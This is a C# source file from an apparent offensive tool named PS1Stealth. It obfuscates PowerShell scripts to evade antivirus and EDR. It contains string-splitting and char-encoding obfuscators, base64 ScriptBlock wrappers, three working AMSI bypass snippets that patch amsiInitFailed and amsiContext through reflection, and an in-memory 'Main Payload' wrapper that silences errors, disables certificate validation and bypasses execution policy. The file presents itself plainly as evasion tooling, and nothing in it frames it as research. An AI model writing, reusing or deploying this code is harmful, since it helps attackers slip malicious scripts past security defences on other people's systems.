using System.Text;
using System.Text.RegularExpressions;

namespace PS1Stealth.Core;

/// <summary>
/// PowerShell script obfuscator for AV/EDR evasion
/// Implements multiple obfuscation techniques
/// </summary>
public static class PowerShellObfuscator
{
    private static readonly Random _random = new Random();

    public static string Obfuscate(string script, ObfuscationLevel level = ObfuscationLevel.Medium)
    {
        var obfuscated = script;

        switch (level)
        {
            case ObfuscationLevel.Light:
                obfuscated = ApplyBasicObfuscation(obfuscated);
                break;

            case ObfuscationLevel.Medium:
                obfuscated = ApplyBasicObfuscation(obfuscated);
                obfuscated = ApplyVariableObfuscation(obfuscated);
                obfuscated = ApplyStringObfuscation(obfuscated);
                break;

            case ObfuscationLevel.Heavy:
                obfuscated = ApplyBasicObfuscation(obfuscated);
                obfuscated = ApplyVariableObfuscation(obfuscated);
                obfuscated = ApplyStringObfuscation(obfuscated);
                obfuscated = ApplyEncodingObfuscation(obfuscated);
                obfuscated = WrapInInvokeExpression(obfuscated);
                break;
        }

        return obfuscated;
    }

    private static string ApplyBasicObfuscation(string script)
    {
        // Add random comments and whitespace
        var lines = script.Split('\n');
        var sb = new StringBuilder();

        foreach (var line in lines)
        {
            // Randomly add comments
            if (_random.Next(100) < 20 && !string.IsNullOrWhiteSpace(line))
            {
                sb.AppendLine($"# {GenerateRandomString(10)}");
            }

            sb.AppendLine(line);

            // Randomly add blank lines
            if (_random.Next(100) < 15)
            {
                sb.AppendLine();
            }
        }

        return sb.ToString();
    }

    private static string ApplyVariableObfuscation(string script)
    {
        // Replace common variable names with random ones
        var commonVars = new[] { "$result", "$output", "$data", "$temp", "$value", "$item" };
        
        foreach (var varName in commonVars)
        {
            if (script.Contains(varName))
            {
                var newName = "$" + GenerateRandomString(8);
                script = script.Replace(varName, newName);
            }
        }

        return script;
    }

    private static string ApplyStringObfuscation(string script)
    {
        // Break up obvious strings using concatenation
        var suspiciousStrings = new[]
        {
            "PowerShell", "Invoke-", "Get-Process", "Get-WmiObject",
            "Download", "Execute", "Bypass", "Hidden"
        };

        foreach (var str in suspiciousStrings)
        {
            if (script.Contains($"'{str}'") || script.Contains($"\"{str}\""))
            {
                var obfuscated = ObfuscateString(str);
                script = script.Replace($"'{str}'", obfuscated);
                script = script.Replace($"\"{str}\"", obfuscated);
            }
        }

        return script;
    }

    private static string ObfuscateString(string input)
    {
        // Split string and concatenate with random splits
        if (input.Length < 3) return $"'{input}'";

        var parts = new List<string>();
        var remaining = input;

        while (remaining.Length > 0)
        {
            var chunkSize = Math.Min(_random.Next(2, 5), remaining.Length);
            parts.Add($"'{remaining.Substring(0, chunkSize)}'");
            remaining = remaining.Substring(chunkSize);
        }

        return "(" + string.Join(" + ", parts) + ")";
    }

    private static string ApplyEncodingObfuscation(string script)
    {
        // Use character code encoding for suspicious keywords
        var keywords = new[] { "Invoke-Expression", "IEX", "Invoke-Command" };

        foreach (var keyword in keywords)
        {
            if (script.Contains(keyword))
            {
                var encoded = EncodeAsCharArray(keyword);
                script = script.Replace(keyword, $"([string]::Join('', {encoded}))");
            }
        }

        return script;
    }

    private static string EncodeAsCharArray(string input)
    {
        var codes = input.Select(c => $"[char]{(int)c}");
        return "(" + string.Join(",", codes) + ")";
    }

    private static string WrapInInvokeExpression(string script)
    {
        // Base64 encode and wrap in Invoke-Expression
        var bytes = Encoding.UTF8.GetBytes(script);
        var base64 = Convert.ToBase64String(bytes);

        // Use obfuscated IEX
        var wrapper = $@"
${'$' + GenerateRandomString(6)} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64}'))
${'$' + GenerateRandomString(6)} = [ScriptBlock]::Create(${'$' + GenerateRandomString(6)})
& ${'$' + GenerateRandomString(6)}
";
        return wrapper;
    }

    public static string AddAMSIBypass(string script)
    {
        // Add AMSI bypass at the beginning (multiple techniques)
        var bypass = @"
# AMSI Bypass - Multiple Techniques
try {
    $a = 'System.Management.Automation.A';
    $b = 'msiUtils';
    $c = $a + $b;
    $d = [Ref].Assembly.GetType($c);
    $e = $d.GetField('ams' + 'iInitF' + 'ailed', 'NonPublic,Static');
    $e.SetValue($null, $true);
} catch {}

try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
} catch {}

try {
    $w = 'System.Management.Automation.A';
    $x = 'msiUtils';
    $y = $w + $x;
    $z = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType($y);
    $z.GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero);
} catch {}

# Original script below
";
        return bypass + script;
    }

    public static string WrapForInMemoryExecution(string script)
    {
        // Wrap script for direct in-memory execution without touching disk
        var wrapped = $@"
# In-Memory Execution Wrapper
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

# Execution Policy Bypass
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Main Payload
{script}
";
        return wrapped;
    }

    private static string GenerateRandomString(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return new string(Enumerable.Range(0, length)
            .Select(_ => chars[_random.Next(chars.Length)])
            .ToArray());
    }
}

public enum ObfuscationLevel
{
    None,
    Light,
    Medium,
    Heavy
}
